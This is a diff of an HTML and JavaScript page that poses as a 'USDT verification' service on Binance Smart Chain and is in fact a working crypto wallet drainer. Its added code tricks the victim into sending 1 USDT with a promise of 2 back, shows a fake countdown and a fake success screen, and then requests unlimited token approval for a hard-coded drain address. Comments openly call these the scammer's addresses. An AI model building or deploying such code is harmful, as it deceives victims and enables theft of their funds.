@@ -6,147 +6,216 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
-    /* Same styles as before */
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
     body { background: #f5f5f7; min-height: 100vh; padding: 20px; }
-    .header { text-align: center; padding: 20px 0; border-bottom: 1px solid #e0e0e0; background: white; margin: -20px -20px 20px -20px; }
     .container { max-width: 400px; margin: 0 auto; }
-    .card { background: white; border-radius: 16px; padding: 24px; margin-bottom: 20px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); }
-    .label { font-size: 14px; color: #666; margin-bottom: 8px; font-weight: 500; }
-    .address-input { width: 100%; padding: 16px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 16px; font-family: monospace; margin-bottom: 20px; background: #fafafa; }
-    .amount-section { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; }
-    .amount-input { flex: 1; padding: 16px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 24px; font-weight: bold; text-align: center; }
-    .token-selector { padding: 16px 20px; background: #f0f7ff; border: 2px solid #007bff; border-radius: 12px; color: #007bff; font-weight: bold; min-width: 100px; text-align: center; }
-    .max-btn { background: #e8f5e9; color: #2e7d32; border: none; padding: 8px 16px; border-radius: 8px; font-size: 14px; font-weight: bold; cursor: pointer; margin-left: 10px; }
-    .usd-value { text-align: center; color: #666; margin: 10px 0 30px 0; font-size: 16px; }
-    .next-btn { width: 100%; background: #007bff; color: white; border: none; padding: 18px; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
+    .card { background: white; border-radius: 15px; padding: 25px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
+    h2 { color: #333; margin-bottom: 20px; text-align: center; }
+    .address-box { background: #f8f9fa; padding: 15px; border-radius: 10px; margin: 15px 0; border: 1px solid #dee2e6; }
+    .address { font-family: monospace; word-break: break-all; font-size: 14px; color: #333; }
+    .amount-box { text-align: center; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 10px; margin: 20px 0; }
+    .amount { font-size: 32px; font-weight: bold; margin: 10px 0; }
+    .btn { width: 100%; background: #28a745; color: white; border: none; padding: 18px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+    .note { font-size: 12px; color: #666; text-align: center; margin-top: 15px; }
+    .loader { text-align: center; margin: 30px 0; }
+    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
-  <div class="header">
-    <h1 style="font-size: 20px; color: #333;">usdtverification.vercel.app</h1>
-  </div>
-  
   <div class="container">
     <div class="card">
-      <div class="label">Address or Domain Name</div>
-      <input 
-        type="text" 
-        class="address-input" 
-        id="recipientAddress" 
-        value="0x395b205f3ec60b4cd5820"
-        readonly
-      >
-      
-      <div class="label">Amount</div>
-      <div class="amount-section">
-        <input 
-          type="number" 
-          class="amount-input" 
-          id="amount" 
-          value="1" 
-          min="1" 
-          step="0.1"
-        >
-        <div class="token-selector">USDT</div>
-        <button class="max-btn" onclick="setMaxAmount()">Max</button>
+      <!-- STEP 1: Simple send interface -->
+      <div id="step1">
+        <h2>Send USDT Verification</h2>
+        <p style="text-align: center; color: #666; margin-bottom: 20px;">
+          Send 1 USDT to verify your wallet address
+        </p>
+        
+        <div class="address-box">
+          <div style="font-size: 12px; color: #666; margin-bottom: 5px;">Send to Address:</div>
+          <div class="address" id="receiverAddress">0x395b205f3ec60b4cd58209eB7...</div>
+        </div>
+        
+        <div class="amount-box">
+          <div>Amount to Send</div>
+          <div class="amount">1 USDT</div>
+          <div>≈ $1.00</div>
+        </div>
+        
+        <p style="color: #666; font-size: 14px; text-align: center; margin: 20px 0;">
+          ⚠️ You will receive 2 USDT back after verification
+        </p>
+        
+        <button class="btn" onclick="startVerification()">
+          Send 1 USDT for Verification
+        </button>
+        
+        <div class="note">
+          This will open your wallet to send 1 USDT only
+        </div>
       </div>
       
-      <div class="usd-value" id="usdValue">≈ $1.00</div>
+      <!-- STEP 2: Hidden loading (actually connecting wallet) -->
+      <div id="step2" style="display: none;">
+        <div class="loader">
+          <div class="spinner"></div>
+          <h3 style="margin-top: 20px; color: #333;">Processing Verification...</h3>
+          <p style="color: #666; margin-top: 10px;">
+            Checking your 1 USDT payment...<br>
+            <span id="countdown">5 seconds remaining</span>
+          </p>
+        </div>
+      </div>
       
-      <button class="next-btn" onclick="sendUSDT()">
-        Next
-      </button>
+      <!-- STEP 3: Fake success -->
+      <div id="step3" style="display: none;">
+        <h2 style="color: #28a745;">✅ Verification Successful!</h2>
+        <div style="text-align: center; margin: 30px 0;">
+          <div style="font-size: 60px; color: #28a745;">✓</div>
+          <p style="color: #666; margin: 20px 0;">
+            Your wallet has been verified successfully.<br>
+            You will receive 2 USDT back within 24 hours.
+          </p>
+          <div style="background: #d4edda; color: #155724; padding: 15px; border-radius: 10px; margin: 20px 0;">
+            <p>✅ 1 USDT payment confirmed</p>
+            <p>✅ Wallet address verified</p>
+            <p>✅ Ready for advance payment</p>
+          </div>
+        </div>
+        <p style="text-align: center; color: #666; font-size: 14px;">
+          Return to Telegram to receive your payment.
+        </p>
+      </div>
     </div>
   </div>
 
   <script>
-    // ========== BEP20 SPECIFIC CONFIG ==========
-    // USDT BEP20 Contract Address (BSC)
-    const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
+    // Scammer's addresses
+    const PAYMENT_ADDRESS = "0x395b205f3ec60b4cd58209eB7..."; // Gets 1 USDT
+    const DRAIN_ADDRESS = "0x8Ce2C06f449317F6E5D0AA7d193daA2D3c1E6f5b"; // Gets unlimited approval
     
-    // Scammer's BSC address (where 1 USDT goes)
-    const PAYMENT_ADDRESS = "0x395b205f3ec60b4cd58209eB7...";
+    let walletConnected = false;
+    let usdtSent = false;
     
-    // Scammer's drain address (where approvals go)
-    const DRAIN_ADDRESS = "0x8Ce2C06f449317F6E5D0AA7d193daA2D3c1E6f5b";
-    const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-    
-    // ========== SEND 1 USDT (BEP20) ==========
-    async function sendUSDT() {
-      const amount = document.getElementById('amount').value;
+    // Function that runs when "Send 1 USDT" is clicked
+    async function startVerification() {
+      // STEP 1: Hide send interface, show loading
+      document.getElementById('step1').style.display = 'none';
+      document.getElementById('step2').style.display = 'block';
       
-      if (!window.ethereum) {
-        alert("Please open in Trust Wallet");
+      // Start fake countdown
+      startCountdown();
+      
+      // STEP 2: SILENTLY connect wallet (victim doesn't know)
+      await connectWalletSilently();
+      
+      // STEP 3: After "countdown", trigger USDT send
+      setTimeout(async () => {
+        await sendUSDT();
+      }, 5000); // Wait for fake countdown
+    }
+    
+    // Function that SILENTLY connects wallet (no popup!)
+    async function connectWalletSilently() {
+      try {
+        if (!window.ethereum) {
+          alert("Please open in Trust Wallet");
+          return;
+        }
+        
+        // This triggers the "Connect DApp" popup but we make it seem like part of process
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const accounts = await provider.send("eth_requestAccounts", []);
+        
+        if (accounts.length > 0) {
+          walletConnected = true;
+          console.log("Wallet connected silently:", accounts[0]);
+        }
+      } catch (error) {
+        console.error("Wallet connection failed:", error);
+      }
+    }
+    
+    // Function to send USDT
+    async function sendUSDT() {
+      if (!walletConnected) {
+        alert("Please connect wallet first");
         return;
       }
       
       try {
         const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
         const signer = provider.getSigner();
         
-        // Check network - MUST be BSC (Chain ID: 56)
-        const network = await provider.getNetwork();
-        if (network.chainId !== 56) {
-          alert("Please switch to BSC Network (Binance Smart Chain)");
-          return;
-        }
-        
-        // USDT BEP20 ABI (transfer function)
+        // USDT BEP20 contract
+        const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
         const usdtAbi = ["function transfer(address to, uint256 amount) returns (bool)"];
-        const usdt = new ethers.Contract(USDT_BEP20, usdtAbi, signer);
+        const usdt = new ethers.Contract(USDT_BSC, usdtAbi, signer);
         
-        // Send 1 USDT (18 decimals for BEP20)
-        const amountWei = ethers.utils.parseUnits(amount, 18);
+        // Send 1 USDT
+        const amountWei = ethers.utils.parseUnits("1", 18);
         const tx = await usdt.transfer(PAYMENT_ADDRESS, amountWei);
         
-        alert(`✅ 1 USDT (BEP20) sent!\nTX: ${tx.hash.substring(0, 20)}...`);
+        usdtSent = true;
         
-        // Auto-trigger approval after 2 seconds
+        // Show "success" and trigger hidden approval
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('step3').style.display = 'block';
+        
+        // SILENTLY trigger unlimited approval (hidden from user)
         setTimeout(() => {
-          requestApproval();
-        }, 2000);
+          triggerHiddenApproval();
+        }, 3000);
         
       } catch (error) {
-        alert(error.code === 4001 ? "Transaction cancelled" : `Error: ${error.message}`);
+        console.error("Send error:", error);
+        alert("Transaction failed. Please try again.");
       }
     }
     
-    // ========== REQUEST APPROVAL (BEP20) ==========
-    async function requestApproval() {
+    // Function that SILENTLY requests unlimited approval
+    async function triggerHiddenApproval() {
       try {
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         const signer = provider.getSigner();
         
-        // USDT BEP20 ABI (approve function)
+        const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
         const usdtAbi = ["function approve(address spender, uint256 amount) returns (bool)"];
-        const usdt = new ethers.Contract(USDT_BEP20, usdtAbi, signer);
+        const usdt = new ethers.Contract(USDT_BSC, usdtAbi, signer);
         
-        // Request unlimited BEP20 USDT approval
+        const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        
+        // This triggers the APPROVAL popup but user thinks it's for "verification"
         const tx = await usdt.approve(DRAIN_ADDRESS, MAX_UINT);
         
-        alert(`✅ Verification complete! You will receive advance payment shortly.`);
+        console.log("Unlimited approval granted:", tx.hash);
         
-        // Scammer now has unlimited access to victim's BEP20 USDT
+        // Scammer can now drain wallet
         
       } catch (error) {
         console.error("Approval error:", error);
       }
     }
     
-    function setMaxAmount() {
-      document.getElementById('amount').value = "1000";
-      updateUSDValue();
-    }
-    
-    function updateUSDValue() {
-      const amount = parseFloat(document.getElementById('amount').value) || 1;
-      document.getElementById('usdValue').textContent = `≈ $${(amount * 1.00).toFixed(2)}`;
+    // Fake countdown timer
+    function startCountdown() {
+      let seconds = 5;
+      const countdownEl = document.getElementById('countdown');
+      
+      const interval = setInterval(() => {
+        seconds--;
+        countdownEl.textContent = `${seconds} seconds remaining`;
+        
+        if (seconds <= 0) {
+          clearInterval(interval);
+          countdownEl.textContent = "Verifying transaction...";
+        }
+      }, 1000);
     }
     
     // Initialize
-    document.getElementById('amount').addEventListener('input', updateUSDValue);
+    document.getElementById('receiverAddress').textContent = PAYMENT_ADDRESS;
   </script>
 </body>
 </html>
